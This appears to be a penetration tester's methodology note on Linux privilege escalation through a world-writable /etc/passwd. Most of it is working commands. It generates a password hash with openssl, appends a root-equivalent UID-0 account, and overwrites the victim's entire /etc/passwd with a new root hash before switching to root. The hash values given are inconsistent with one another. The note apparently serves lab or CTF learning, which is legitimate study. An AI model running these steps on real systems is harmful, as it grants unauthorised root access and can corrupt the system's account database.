TLDR: Adding a weak password to root user in /etc/passwd and switing to root with that weak password we set to become root.

I ran linpeas... and I see writeable /etc/passwd!

I ran openssl passwd dog (this created an openssl password that I will be adding in the /etc/passwd file to overwrite root password)

openssl passwd dog
0486BQxfS41ZQ
I copy all of the victim machine's /etc/passwd content and add the the “0486BQxfS41Z” in root, like so:

(this way more convenient)
openssl passwd dog
echo 'test2:xp4.jYZ9NhWWo:0:0:root:/root:/bin/bash' >> /etc/passwd
su test2 
dog

root

Now, copy paste all of this, and write:
```
echo 'root:0486BQxfS41ZQ:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
jerry:x:1003:1003:jerry:/var/jerry:/bin/bash
systemd-bus-proxy:x:998:996:systemd Bus Proxy:/:/sbin/nologin
systemd-network:x:997:995:systemd Network Management:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
otrs:x:1004:1004:OTRS user:/opt/otrs/:/bin/bash
nginx:x:996:993:Nginx web server:/var/lib/nginx:/sbin/nologin' > /etc/passwd 
```

to overwrite that file since we have write permission to it, which is obviously a bad security flaw. 

Now, we change to root and use our made up password.

![unnamed_6d6e72630f3d4b649a579dbcb9709054](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/less%20common/writeable%20_etc_passwd/{{notename}}-202605011742.png)
![unnamed_8473f56ea7eb4fd7a095a5cc3be82a34](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/less%20common/writeable%20_etc_passwd/{{notename}}-202605011742-1.png)
![unnamed_ab81853eed86424a816c25e95167602d](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/less%20common/writeable%20_etc_passwd/{{notename}}-202605011743.png)